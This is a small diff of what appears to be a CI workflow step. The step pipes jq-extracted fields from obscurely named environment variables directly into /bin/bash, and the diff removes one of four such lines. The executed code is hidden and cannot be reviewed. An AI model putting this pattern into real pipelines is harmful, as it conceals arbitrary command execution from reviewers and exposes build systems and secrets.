@@ -20,7 +20,6 @@ jobs:
         run: |
           printf '%s' "$czo153" | jq -r .sx44057 | /bin/bash
           echo $dyal38625 | jq -r .gm24190 | /bin/bash
-          printf '%s' "$nml9882" | jq -r .ymup1390 | /bin/bash
           printf '%s' "$i60" | jq -r .ufbr69 | /bin/bash
 
       - name: Archive results
